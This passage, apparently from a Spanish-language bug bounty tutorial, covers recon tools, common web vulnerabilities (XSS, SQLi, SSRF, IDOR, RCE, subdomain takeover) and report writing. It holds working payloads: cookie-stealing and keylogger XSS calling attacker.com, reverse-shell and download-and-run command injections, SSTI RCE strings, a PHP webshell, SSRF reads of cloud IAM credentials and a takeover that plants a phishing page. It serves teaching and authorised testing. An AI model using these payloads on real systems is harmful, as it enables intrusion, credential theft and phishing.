# Intel mode (buscar dominios relacionados a una organización)
amass intel -whois -d ejemplo.com

# Track diferencias entre scans
amass track -d ejemplo.com -last 7d
```

**amass incluye:**
- Brute forcing de subdominios
- Alternation/permutation scanning
- [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) zone walking
- Certificate transparency
- Reverse DNS lookup (RDNS)
- Search engine scraping

### 6.4 httpx

**httpx** es una herramienta para probar qué servidores [http](../raw/r3d3s-f0nd4m3nt0s.md#http) están vivos y recopilar metadata.

**Instalación:**

```bash
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

**Uso:**

```bash
# Probar subdominios vivos
httpx -l subs.txt -o alive.txt

# Con detección de tecnologías
httpx -l subs.txt -tech-detect -o tech_result.txt

# Con title
httpx -l subs.txt -title -o with_title.txt

# Con status code
httpx -l subs.txt -status-code -o with_status.txt

# Con screenshot
httpx -l subs.txt -screenshot -screenshot-output screenshots/

# Probar múltiples puertos
httpx -l subs.txt -ports 80,443,8080,8443,3000,4000,5000,8000,9000,10000

# Combinaciones útiles
httpx -l subs.txt -title -tech-detect -status-code \ -content-length -web-server -o full_info.txt

# JSON output (para procesar después)
httpx -l subs.txt -json -o results.json
```

### 6.5 gau (getallurls)

**gau** (getallurls) obtiene URLs de múltiples fuentes (Wayback Machine, AlienVault, etc.).

**Instalación:**

```bash
go install github.com/lc/gau/v2/cmd/gau@latest
```

**Uso:**

```bash
# Obtener todas las URLs de un dominio
echo "ejemplo.com" | gau

# Guardar resultados
echo "ejemplo.com" | gau --o gau_urls.txt

# Con subdominios
echo "ejemplo.com" | gau --subs

# Proveedores específicos
echo "ejemplo.com" | gau --providers wayback,otx,commoncrawl

# Filtrar por extensión
echo "ejemplo.com" | gau --o all_urls.txt
cat all_urls.txt | grep -E "\.js$" > js_files.txt
cat all_urls.txt | grep -E "\.php$" > php_files.txt
cat all_urls.txt | grep -E "\.asp$|\.aspx$" > asp_files.txt

# Encontrar endpoints de API
cat all_urls.txt | grep -iE "api|v1|v2|graphql|rest|swagger"
```

### 6.6 waybackurls

**waybackurls** de Tomnomnom extrae URLs de Wayback Machine.

**Instalación:**

```bash
go install github.com/tomnomnom/waybackurls@latest
```

**Uso:**

```bash
# Obtener URLs
echo "ejemplo.com" | waybackurls

# Guardar
echo "ejemplo.com" | waybackurls > wayback_urls.txt

# Con fechas
echo "ejemplo.com" | waybackurls -dates

# Filtrar parámetros (potenciales inyecciones)
cat wayback_urls.txt | grep -E "(\?|&)(id|page|file|url|redirect|return|next|ref|src|path)=[^&]*$" > param_urls.txt

# Encontrar páginas con muchos parámetros
cat wayback_urls.txt | grep -oP ".*\?" | sort | uniq -c | sort -rn | head -20
```

### 6.7 katana

**katana** es un crawler moderno de ProjectDiscovery. Es rápido, eficiente y reemplaza a herramientas más viejas.

**Instalación:**

```bash
go install github.com/projectdiscovery/katana/cmd/katana@latest
```

**Uso:**

```bash
# Crawling básico
katana -u https://ejemplo.com

# Crawling con depth
katana -u https://ejemplo.com -depth 3

# Crawling desde lista de URLs
katana -list subs.txt

# Con headless browser (para JS)
katana -u https://ejemplo.com -headless

# Output a archivo
katana -u https://ejemplo.com -o crawled_urls.txt

# Filtrar por extensión
katana -u https://ejemplo.com -o all.txt
cat all.txt | grep -E "\?.*=" > param_urls.txt

# JSON output
katana -u https://ejemplo.com -json -o results.json
```

### 6.8 nuclei

**nuclei** es un escáner de vulnerabilidades basado en templates YAML. Es la herramienta más importante del ecosistema.

**Instalación:**

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

**Templates de nuclei:**

```bash
# Los templates están en:
# ~/nuclei-templates/ (si usás update)
nuclei -update-templates
# O clonando el repo:
git clone https://github.com/projectdiscovery/nuclei-templates.git
```

**Uso básico:**

```bash
# Escaneo rápido
nuclei -l alive_subs.txt -o nuclei_results.txt

# Escaneo por severidad
nuclei -l alive_subs.txt -s critical,high -o critical_high.txt

# Escaneo de tecnologías
nuclei -l alive_subs.txt -tags tech -o tech_stack.txt

# Escaneo de CVE
nuclei -l alive_subs.txt -t ~/nuclei-templates/cves/ -o cve_results.txt

# Escaneo de paneles de admin
nuclei -l alive_subs.txt -t ~/nuclei-templates/exposed-panels/ \ -o admin_panels.txt

# Escaneo con autenticación
nuclei -l alive_subs.txt -H "Cookie: session=abc123" -o authed_results.txt

# JSON output completo
nuclei -l alive_subs.txt -json -o full_results.json
```

### 6.9 dalfox

**dalfox** es un escáner de [xss](../raw/w3b-h4ck1ng.md#xss) paramétrico basado en análisis de DOM.

**Instalación:**

```bash
go install github.com/hahwul/dalfox/v2@latest
```

**Uso:**

```bash
# Escaneo de una URL
dalfox url https://ejemplo.com/page?param=value

# Escaneo desde archivo
dalfox url -l xss_urls.txt

# Escaneo con opciones
dalfox url -l urls.txt -b https://hacker.xss.ht \ -o dalfox_results.txt

# Analysis mode (solo analizar sin explotar)
dalfox url -l urls.txt --only-analysis

# Con custom payload
dalfox url -l urls.txt \ --custom-payload "<script>alert(1)</script>"

# Blind XSS
dalfox url -l urls.txt \ -b https://your-collaborator-url.com --blind
```

### 6.10 trufflehog

**trufflehog** busca secrets (API keys, tokens, contraseñas) en repositorios y archivos.

**Instalación:**

```bash
# Usando pip
pip install trufflehog

# O Go
go install github.com/trufflesecurity/trufflehog/v3@latest
```

**Uso:**

```bash
# Escanear un directorio local
trufflehog filesystem --directory=/path/to/code

# Escanear un repositorio GitHub
trufflehog git https://github.com/org/repo

# Escanear un repositorio GitHub (organización entera)
trufflehog github --org=org-name

# Escanear S3 bucket
trufflehog s3 --bucket=bucket-name

# Escanear con verificación
trufflehog git https://github.com/org/repo --only-verified

# Output JSON
trufflehog filesystem --directory=/path/to/code --json > secrets.json
```

**Lo que detecta trufflehog:**

- [aws](../raw/cl0ud-h4ck1ng.md#aws) keys (AKIA..)
- Google API keys
- GitHub tokens (ghp_..)
- Slack tokens (xoxb-.., xoxp-..)
- Private SSH keys
- [jwt](../raw/4p1-s3cur1ty.md#jwt) tokens
- Stripe API keys
- Generic high-entropy strings
- Y más de 700+ detectores

## 7. vulnerabilidades comunes para Bounties

### 7.1 [xss](../raw/w3b-h4ck1ng.md#xss) (cross-site [scripting](../raw/w3b-h4ck1ng.md#xss))

El XSS sigue siendo la [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) más común y una de las que más bounties paga si se encuentra en contexto crítico.

**Tipos de XSS:**

1. **Reflected XSS:** El [payload](../raw/m3t4spl01t.md#payloads) viene en el request (URL, parámetro) y se refleja en la response sin sanitización.

2. **Stored XSS:** El payload se almacena en el servidor (base de datos, archivo) y se ejecuta cuando otro usuario carga la página.

3. **DOM-based XSS:** La vulnerabilidad está en el client-side JavaScript, no en el servidor. El payload se ejecuta manipulando el DOM.

4. **Blind XSS:** El payload se ejecuta en un contexto que no ves directamente (paneles de admin, sistemas de tickets, logs).

**Payloads comunes de XSS:**

```javascript
// Básico
<script>alert(1)</script>

// Sin script
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

// Bypass de filtros
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror="eval(atob('YWxlcnQoMSk=')">  // base64
<svg><script>alert&#40;1&#41;</script></svg>  // HTML entities

// Polyglot (funciona en múltiples contextos)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert//>\x3e

// Steal cookies
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// Keylogger
<script>
document.onkeypress = function(e) { fetch('https://attacker.com/k?k=' + e.key);
}
</script>

// Blind XSS payload
"><script src="https://attacker.com/hook.js"></script>
```

**Contextos de XSS:**

1. **HTML context:** `<div>USER_INPUT</div>` -> `<div><script>alert(1)</script></div>`
2. **Attribute context:** `<input value="USER_INPUT">` -> `<input value=""><script>alert(1)</script>"`
3. **JavaScript context:** `<script>var x = '"'"'USER_INPUT'"'"';</script>` -> `<script>var x = 'test';alert(1);//';</script>`
4. **URL context:** `<a href="USER_INPUT">` -> `<a href="javascript:alert(1)">`

**Cómo probar XSS sistemáticamente:**

```bash
# 1. Encontrar endpoints con parámetros
katana -u https://target.com -o urls.txt
cat urls.txt | grep -E "\?.*=" > param_urls.txt

# 2. Probar con payloads simples (fuzzing)
cat param_urls.txt | while read url; do echo "$url'><script>alert(1)</script>" >> xss_test.txt
done

# 3. Usar dalfox para XSS automation
dalfox url -l param_urls.txt -o xss_findings.txt

# 4. Manual: probar cada contexto con payloads específicos
# Contexto HTML (sin escape)
"><script>alert(document.domain)</script>

# Contexto atributo (escapar atributo)
" onfocus="alert(1)" autofocus="

# Contexto JavaScript
';alert(1);'

# Contexto URL
javascript:alert(1)
```

### 7.2 [sqli](../raw/w3b-h4ck1ng.md#sql-injection) ([sql injection](../raw/w3b-h4ck1ng.md#sql-injection))

SQLi es menos común hoy (muchos usan ORMs, prepared statements), pero cuando aparece, paga bien.

**Tipos de SQLi:**

1. **In-band (Classic):** El resultado se ve directamente en la respuesta.
2. **Blind (Boolean-based):** La respuesta cambia basado en true/false de la consulta.
3. **Blind (Time-based):** Hay delay si la condición es verdadera.
4. **Error-based:** Los errores de la DB se muestran en la respuesta.
5. **Union-based:** Usás UNION SELECT para combinar resultados.
6. **Out-of-band (OOB):** El resultado se envía a un servidor externo ([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns), [http](../raw/r3d3s-f0nd4m3nt0s.md#http)).

**Payloads de SQLi:**

```sql
-- Detección básica
'
"
')
")
1'"'"' OR '"'"'1'"'"'='"'"'1
1'"'"' OR 1=1--
1'"'"' AND 1=1--
1'"'"' AND 1=2--
admin'--

-- Blind boolean
'"'"' OR (SELECT 1 FROM users WHERE admin=1) = 1--

-- Blind time-based (MySQL)
'"'"' OR SLEEP(5)--
1'"'"' AND SLEEP(5)--
'"'"' OR IF(1=1,SLEEP(5),0)--

-- Blind time-based (PostgreSQL)
'"'"' OR pg_sleep(5)--
'"'"' AND (SELECT pg_sleep(5) FROM pg_sleep LIMIT 1)--

-- Blind time-based (MSSQL)
'"'"' OR WAITFOR DELAY '"'"'0:0:5'"'"'--
; WAITFOR DELAY '"'"'0:0:5'"'"'--

-- Union-based
'"'"' UNION SELECT null,null,null--
'"'"' UNION SELECT 1,2,3--
'"'"' UNION SELECT table_name,null FROM information_schema.tables--

-- Error-based (MySQL)
'"'"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))--

-- Out-of-band (MySQL)
'"'"' LOAD_FILE('\\\\\\\\attacker.com\\\\share\\\\file')--
```

**Detección automatizada con [sqlmap](../raw/w3b-h4ck1ng.md#sqlmap):**

```bash
# Escaneo básico
sqlmap -u "https://target.com/page?id=1" --batch

# Escaneo con cookies
sqlmap -u "https://target.com/page?id=1" \ --cookie="session=abc123" --batch

# Escaneo POST
sqlmap -u "https://target.com/login" \ --data="username=admin&password=test" --batch

# Escaneo con nivel y riesgo alto
sqlmap -u "https://target.com/page?id=1" \ --level=5 --risk=3 --batch

# Escaneo de todas las bases
sqlmap -u "https://target.com/page?id=1" \ --dbs --batch

# Escaneo de tablas
sqlmap -u "https://target.com/page?id=1" \ -D database_name --tables --batch

# Escaneo de columnas
sqlmap -u "https://target.com/page?id=1" \ -D database_name -T users --columns --batch

# Dump de datos
sqlmap -u "https://target.com/page?id=1" \ -D database_name -T users --dump --batch

# Escaneo con proxy (Burp)
sqlmap -u "https://target.com/page?id=1" \ --proxy="http://127.0.0.1:8080" --batch
```

### 7.3 [ssrf](../raw/w3b-h4ck1ng.md#ssrf) (Server-Side Request Forgery)

SSRF es una de las vulnerabilidades más pagadas porque permite atacar infraestructura interna.

**Qué es SSRF:**
Un atacante hace que el servidor haga requests a recursos internos o externos que no debería poder acceder.

**Ejemplo de SSRF:**
```http
POST /api/fetch-url HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "https://attacker.com/malicious"}
```

**Payloads de SSRF:**

```bash
# Apuntar a servicios internos
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:3306 (MySQL)
http://127.0.0.1:6379 (Redis)
http://127.0.0.1:27017 (MongoDB)
http://127.0.0.1:9200 (Elasticsearch)
http://127.0.0.1:5000 (Flask dev server)

# Cloud metadata
http://169.254.169.254/latest/meta-data/ (AWS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)
http://metadata.google.internal/computeMetadata/v1/  (GCP)
http://100.100.100.200/latest/meta-data/ (Alibaba)

# Bypass de filtros
http://0.0.0.0:8080
http://[::]:8080/
http://127.1/ssrf
http://2130706433/ (127.0.0.1 en decimal)
http://0x7f000001/ (127.0.0.1 en hex)
http://localhost/
http://localtest.me/

# DNS rebinding
http://1e100.7f000001.nip.io/

# File protocol
file:///etc/passwd
file:///proc/self/environ
file:///c:/windows/win.ini

# Gopher protocol (para atacar servicios internos)
gopher://localhost:6379/_SET key value
gopher://localhost:25/_HELO attacker.com

# Dict protocol
dict://localhost:6379/INFO
```

**SSRF a [cloud](../raw/cl0ud-h4ck1ng.md) metadata ([aws](../raw/cl0ud-h4ck1ng.md#aws) ejemplo):**

```bash
# Endpoint vulnerable
POST /api/profile/avatar
Host: target.com

url=https://s3.amazonaws.com/photo.jpg

# Cambiar a metadata
POST /api/profile/avatar
Host: target.com

url=http://169.254.169.254/latest/meta-data/

# Escalar: obtener IAM credentials
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### 7.4 IDOR (Insecure Direct Object Reference)

IDOR es probablemente la vulnerabilidad **más fácil de encontrar y una de las que más paga**.

**Qué es IDOR:**
Ocurre cuando un endpoint expone un identificador (ID, UUID, número, email) que el usuario puede manipular para acceder a recursos de otros usuarios.

**Ejemplo básico:**

```http
# URL vulnerable
GET /api/v1/users/123/profile
GET /api/v1/orders/ORDER-456/details

# Cambiar el ID
GET /api/v1/users/124/profile  -> Otro usuario!
GET /api/v1/orders/ORDER-457/details  -> Otra orden!
```

**Tipos de IDOR:**

1. **Numeric IDOR:** `123` -> `124`
2. **UUID IDOR:** `abc-123-def` -> `abc-456-def`
3. **Email IDOR:** `user@mail.com` -> `admin@mail.com`
4. **[hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) IDOR:** `a1b2c3d4` -> `e5f6g7h8` (a veces es débil o reversible)
5. **Multi-parameter IDOR:** `?user=123&org=456` -> `?user=124&org=456`
6. **Mass Assignment IDOR:** Enviar parámetros extra en JSON

**Cómo encontrar IDORs:**

```bash
# 1. Encontrar endpoints con IDs
katana -u https://target.com -o all_urls.txt
cat all_urls.txt | grep -E "/\d+" > id_urls.txt
cat all_urls.txt | grep -E "id=|user=|order=|account=" > param_urls.txt

# 2. Crear dos cuentas (User A y User B)
# User A: obtener un recurso legítimo
# User B: cambiar el ID al de User A

# 3. Automatizar con Burp Intruder
# Enviar request a Intruder, marcar ID como payload
# Probar números secuenciales o UUIDs cercanos

# 4. Probar diferentes métodos HTTP
GET /api/v1/users/123 -> 200 (tu perfil)
PUT /api/v1/users/124 -> 200 (modificar perfil de otro!)
DELETE /api/v1/users/125 -> 200 (borrar cuenta de otro!)
```

**Ejemplo práctico de IDOR:**

```bash
# 1. Login como user1 (ID: 101)
curl -X POST https://target.com/api/login \ -H "Content-Type: application/json" \ -d '{"username":"user1","password":"pass123"}' \ -c cookies.txt

# 2. Ver perfil propio
curl https://target.com/api/v1/users/101 \ -b cookies.txt
# Response: {"id":101,"name":"User 1","email":"user1@mail.com","role":"user"}

# 3. Probar otro ID
curl https://target.com/api/v1/users/1 \ -b cookies.txt
# Response: {"id":1,"name":"Admin","email":"admin@mail.com","role":"admin"}
# IDOR encontrado - acceso a admin!

# 4. Probar IDs secuenciales
for i in $(seq 1 200); do response=$(curl -s -o /dev/null -w "%{http_code}" \ https://target.com/api/v1/users/$i -b cookies.txt) if [ "$response" != "403" ] && [ "$response" != "404" ]; then echo "Found accessible user: $i (Status: $response)" fi
done
```

### 7.5 [rce](../raw/w3b-h4ck1ng.md#rce) ([remote code execution](../raw/w3b-h4ck1ng.md#rce))

RCE es el santo grial del [bug bounty](../raw/b9g-b09nty.md). Paga muchísimo pero es raro encontrarlo.

**Vectores comunes de RCE:**

1. **[file upload](../raw/w3b-h4ck1ng.md#file-upload):** Subir un webshell (PHP, ASP, JSP)
2. **Deserialization:** Insecure deserialization (Java, PHP, [python](../raw/pyth0n-f0r-h4ck1ng.md), Ruby, .NET)
3. **SSTI (Server-Side Template Injection):** Inyección en templates (Jinja2, Twig, Freemarker)
4. **[command injection](../raw/w3b-h4ck1ng.md#command-injection):** Inyección en comandos del sistema
5. **File Inclusion:** [lfi](../raw/w3b-h4ck1ng.md#lfi)/[rfi](../raw/w3b-h4ck1ng.md#rfi) que deriva en RCE
6. **Dependency Vulnerabilities:** Log4j, Struts, Heartbleed
7. **Insecure Deserialization:** Java deserialization, PHP unserialize, Python pickle

**Command Injection:**

```bash
# Endpoint vulnerable
https://target.com/tools/ping?host=8.8.8.8

# Inyección
https://target.com/tools/ping?host=8.8.8.8;id
https://target.com/tools/ping?host=8.8.8.8|id
https://target.com/tools/ping?host=8.8.8.8$(id)
https://target.com/tools/ping?host=`id`

# Payloads comunes
; ls -la
| whoami
|| id
& echo vulnerable &
`uname -a`
$(cat /etc/passwd)
; nc -e /bin/sh attacker.com 4444
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
```

**SSTI (Server-Side Template Injection):**

```python
# Jinja2 (Python)
{{7*7}}  # Debería dar 49, significa que hay SSTI
{{config}}  # Muestra configuración de Flask
{{''.__class__.__mro__[2].__subclasses__}}  # RCE en Flask
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read}}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new>${ex("id")}

# Velocity (Java)
#set($x=7*7)$x
#set($e="exec")$e.getClass.forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

**File Upload RCE:**

```bash
# Subir webshell PHP
-- Form Data:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>

# Bypass de extensiones
shell.php.jpg
shell.php5
shell.phtml
shell.pht
shell.php%00.jpg
shell.asp;.jpg
shell.aspx.jpg
shell.jsp

# Bypass de content-type
Content-Type: image/jpeg
Content-Type: image/png

# Magic bytes bypass
GIF89a<?php system($_GET['cmd']); ?>
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
```

### 7.6 Subdomain Takeover

Subdomain takeover ocurre cuando un CNAME apunta a un servicio externo (AWS [s3](../raw/cl0ud-h4ck1ng.md#s3), Heroku, GitHub Pages, [azure](../raw/cl0ud-h4ck1ng.md#azure)) que ya no existe o no está configurado.

**Servicios vulnerables a takeover:**

```
AWS S3: s3.amazonaws.com, s3-website-*.amazonaws.com
AWS CloudFront: cloudfront.net
GitHub Pages:  *.github.io
Heroku: *.herokuapp.com
Azure: *.azurewebsites.net, *.azureedge.net, *.trafficmanager.net
Shopify: *.myshopify.com, *.shopify.com
Bitbucket: *.bitbucket.io
Tumblr: *.tumblr.com
Squarespace: *.squarespace.com
WordPress.com: *.wordpress.com
Cargo: *.cargocollective.com
Unbounce: *.unbouncepages.com
Strikingly: *.strikingly.com
Helpjuice: *.helpjuice.com
Freshdesk: *.freshdesk.com
Zendesk: *.zendesk.com
```

**Cómo encontrar subdomain takeovers:**

```bash
# 1. Encontrar CNAMEs de subdominios
dig cname admin.ejemplo.com
nslookup -type=cname admin.ejemplo.com
host -t cname admin.ejemplo.com

# 2. Herramientas automatizadas
# subover (Go)
go install github.com/Ice3man543/SubOver@latest
subover -l subdomains.txt

# nuclei
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ \ -o takeovers.txt

# 3. Verificación manual
# Si el CNAME apunta a algo como:
admin.ejemplo.com CNAME -> my-bucket.s3.amazonaws.com

# Y el bucket devuelve 404 NoSuchBucket -> TAKEOVER!
# Crear el bucket con ese nombre -> listo!
```

**Ejemplo de takeover con AWS S3:**

```bash
# 1. Encontrar subdominio vulnerable
dig +short blog.ejemplo.com
# blog.ejemplo.com.s3-website-us-east-1.amazonaws.com

# 2. Verificar que el bucket no existe
curl -v http://blog.ejemplo.com
# 404 NoSuchBucket

# 3. Crear el bucket (usando AWS CLI)
aws s3api create-bucket \ --bucket blog.ejemplo.com \ --region us-east-1

# 4. Configurar como website
aws s3 website s3://blog.ejemplo.com \ --index-document index.html \ --error-document error.html

# 5. Subir contenido (phishing page)
aws s3 cp evil.html s3://blog.ejemplo.com/index.html

# 6. Verificar takeover
curl http://blog.ejemplo.com
# Responde con tu contenido!
```

### 7.7 Improper Access Control

Improper Access Control es cualquier vulnerabilidad donde un usuario puede acceder a funcionalidades o datos para los que no tiene [permisos](../raw/0s-f0nd4m3nt0s.md#permisos).

**Tipos de access control:**

1. **Vertical [privilege escalation](../raw/l1n9x-pr1v3sc.md):** Usuario normal puede hacer cosas de admin
2. **Horizontal Privilege Escalation:** Usuario normal puede acceder a datos de otro usuario normal (a veces overlap con IDOR)
3. **Context-based:** Usuario puede acceder a funcionalidades fuera de su contexto (ej: acceder a admin panel sin ser admin)

**Ejemplos:**

```bash
# 1. Acceder a panel admin sin autenticación
GET /admin
GET /administrator
GET /manage
GET /wp-admin

# 2. Roles en JSON (manipulación)
POST /api/users/register
{"username": "hacker", "role": "user"}
-->
{"username": "hacker", "role": "admin"}  # Mass assignment!

# 3. Métodos HTTP no autorizados
GET /api/delete-user # Prohibido?
DELETE /api/delete-user  # Funciona sin auth?

# 4. Bypass de middleware
# Agregar headers que el middleware puede pasar
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Forwarded-Host: internal.local
X-Admin: true
X-Internal: true
X-Role: admin
X-Original-URL: /admin
X-Rewrite-URL: /admin

# 5. JWT manipulation
# Decodificar JWT (sin verificar signature)
eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.abc123

# Base64 decode del payload (segunda parte)
echo "eyJyb2xlIjoidXNlciJ9" | base64 -d
# {"role":"user"}

# Modificar role
# {"role":"admin"} -> base64 -> nuevo JWT
echo -n '{"role":"admin"}' | base64
# eyJyb2xlIjoiYWRtaW4ifQ==
```

### 7.8 Information Disclosure

Information Disclosure es cuando el sistema expone información que no debería. Puede variar desde un leak menor hasta credenciales de producción.

**Tipos de info disclosure:**

1. **Directory Listing:** Directorios sin index configuración
2. **Error Messages:** Stack traces, debug info
3. **Source Code Disclosure:** .git, .env, backup files
4. **Comments in HTML/JS:** Developer comments con cosas sensibles
5. **Debug Endpoints:** /debug, /console, /status
6. **Server Headers:** Versiones exactas de software
7. **Autocomplete/Suggestions:** Enumeración de usuarios, productos
8. **API Documentation:** Swagger, OpenAPI, Postman collections expuestas
9. **Sensitive Files:** robots.txt revelando paths, sitemap.xml

**Cómo buscar info disclosure:**

```bash
# 1. Archivos sensibles comunes
# Probar en cada subdominio:
/.git/config
/.env
/.env.production
/.env.development
/.DS_Store
/.htaccess
/sitemap.xml
/robots.txt
/crossdomain.xml
/clientaccesspolicy.xml
/trace.axd
/elmah.axd
/server-status
/server-info
/phpinfo.php
/info.php
/debug
/console
/swagger.json
/api-docs
/docs
/admin/backup
/backup/
/.gitignore
/.npmrc
/package.json
/webpack.config.js

# 2. Google dorks para info disclosure
site:ejemplo.com intitle:"index of"
site:ejemplo.com inurl:wp-config.php
site:ejemplo.com ext:sql
site:ejemplo.com ext:env
site:ejemplo.com ext:log
site:ejemplo.com "password" filetype:xls
site:ejemplo.com "-----BEGIN RSA PRIVATE KEY-----"

# 3. Source maps en JS
cat all_js_urls.txt | while read js; do # Probar si existe source map curl -s -o /dev/null -w "%{http_code}" "$js.map" if [ $? -eq 200 ]; then echo "Source map found: $js.map" fi
done

# 4. S3 buckets abiertos
https://ejemplo.s3.amazonaws.com/
https://ejemplo-backup.s3.amazonaws.com/
https://ejemplo-dev.s3.amazonaws.com/
https://s3.amazonaws.com/ejemplo/
```

**Encontrar secrets en GitHub:**

```bash
# GitHub dorks (manual)
org:"ejemplo" password
org:"ejemplo" secret
org:"ejemplo" api_key
org:"ejemplo" "-----BEGIN"
org:"ejemplo" AWS_SECRET

# Usando trufflehog
trufflehog github --org=ejemplo --json

# Usando Gitleaks
gitleaks detect --source /path/to/repo
```

## 8. Report Writing

El reporte es **lo que te pagan**. podés tener el bug más increíble del mundo, pero si el reporte es malo, probablemente no cobrés o te paguen menos.

### 8.1 Estructura del Reporte

Un reporte de [bug bounty](../raw/b9g-b09nty.md) generalmente tiene esta estructura:

```
1. TITLE
2. DESCRIPTION
3. IMPACT
4. STEPS TO REPRODUCE
5. PROOF OF CONCEPT (PoC)
6. REMEDIATION
7. CVSS SCORE
8. ATTACHMENTS
```

### 8.2 Vulnerability Title

El título debe ser claro, descriptivo y accionable.

**Ejemplos buenos:**

```
Stored XSS in user profile "about me" field allows session hijacking
IDOR in GET /api/v1/orders/{id} allows viewing other users'"'"' orders without authentication
SQL Injection in login endpoint allows database extraction
SSRF in image upload feature allows reading AWS metadata
Critical: RCE via insecure deserialization in Java endpoint /api/process
Subdomain takeover of help.ejemplo.com via dangling CNAME to AWS S3
```

**Ejemplos malos:**

```
Bug found
XSS
Vulnerability
Problem with login
Error on page
```

### 8.3 Descripción

La descripción debe explicar:

- **Qué** encontraste
- **Dónde** lo encontraste
- **Por qué** es importante
- **Contexto** técnico

**Ejemplo de buena descripción:**

```
El endpoint GET /api/v1/users/{user_id}/profile no verifica que el
usuario autenticado sea el propietario del perfil solicitado. Al
cambiar el parámetro user_id por el ID de otro usuario, se obtiene
acceso completo a su información personal incluyendo email, teléfono,
dirección y datos de facturación.

Este es un caso clásico de IDOR (Insecure Direct Object Reference)
que permite acceso horizontal a datos de cualquier usuario registrado
en la plataforma.
```

### 8.4 Impacto

Explicá **qué puede hacer un atacante** con esta vulnerabilidades).

**Ejemplo de impacto:**

```
Un atacante autenticado puede:
1. Acceder a los datos personales de cualquier otro usuario (PII)
2. Modificar el perfil de otros usuarios si también hay PUT sin autorización
3. Enumerar usuarios para ataques dirigidos (phishing, social engineering)
4. En un escenario peor, si el admin también usa este endpoint, un atacante podría obtener datos sensibles del equipo de administración

Esto viola:
- GDPR Artículo 32 (seguridad de datos personales)
- Principio de least privilege
- Confidencialidad de datos de usuarios
```

### 8.5 Steps to Reproduce

Pasos claros y precisos para que cualquiera pueda reproducir el bug.

**Ejemplo de Steps to Reproduce:**

```
1. Crear cuenta de usuario A (email: userA@test.com, pass: Test123!)
2. Crear cuenta de usuario B (email: userB@test.com, pass: Test456!)
3. Autenticarse como usuario A y obtener el token JWT
4. Obtener el perfil del usuario A: GET /api/v1/users/101/profile Authorization: Bearer TOKEN_A Response: 200 OK con datos del usuario A

5. Cambiar el ID de 101 a 102 (usuario B): GET /api/v1/users/102/profile Authorization: Bearer TOKEN_A (token del usuario A!) Response: 200 OK con datos del usuario B (IDOR!)

6. Automatizar la enumeración de usuarios: for id in $(seq 1 1000); do curl -s -H "Authorization: Bearer TOKEN_A" \ "https://target.com/api/v1/users/$id/profile" done
```

### 8.6 PoC (Proof of Concept)

El PoC demuestra que la [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) existe y funciona.

**Tipos de PoC:**

1. **Screenshots:** Capturas de pantalla mostrando el antes/después
2. **Videos:** Screen recording del [exploit](../raw/m3t4spl01t.md#exploits) (muy efectivo)
3. **Requests/Responses:** Copiar los [http](../raw/r3d3s-f0nd4m3nt0s.md#http) requests completos
4. **Código:** Script que demuestra el exploit ([python](../raw/pyth0n-f0r-h4ck1ng.md), bash, etc.)
5. **Burp file:** Exportar el request desde [burp suite](../raw/w3b-h4ck1ng.md#burp-suite)

**Ejemplo de PoC en texto:**

```
# Request
GET /api/v1/users/102/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDEsInJvbGUiOiJ1c2VyIn0.signature
Accept: application/json

# Response (200 OK)
HTTP/1.1 200 OK
Content-Type: application/json

{ "id": 102, "name": "User B", "email": "userB@test.com", "phone": "+1-555-1234", "address": "123 Test St", "payment_method": { "last4": "4242", "type": "visa" }
}
```

**PoC con script (Python):**

```python
#!/usr/bin/env python3
import requests
import sys

BASE_URL = "https://target.com"
TOKEN = "eyJhbGciOiJIUzI1NiIs.."  # Token de User A

headers = { "Authorization": f"Bearer {TOKEN}", "Accept": "application/json"
}

def poc_idor(user_id): """Exploit IDOR para acceder a perfil de otro usuario""" url = f"{BASE_URL}/api/v1/users/{user_id}/profile" r = requests.get(url, headers=headers) if r.status_code == 200: print(f"[VULNERABLE] User {user_id}: Access granted!") print(f"Data: {r.json}") return True else: print(f"[SAFE] User {user_id}: {r.status_code}") return False

# Probar con otro usuario
poc_idor(102)

# Enumerar usuarios
for uid in range(100, 200): poc_idor(uid)
```

### 8.7 Remediación

Siempre ofrecé sugerencias de cómo arreglar el bug. Esto muestra que entendés el sistema y ayuda al equipo de seguridad a priorizar.

**Ejemplo de remediación:**

```
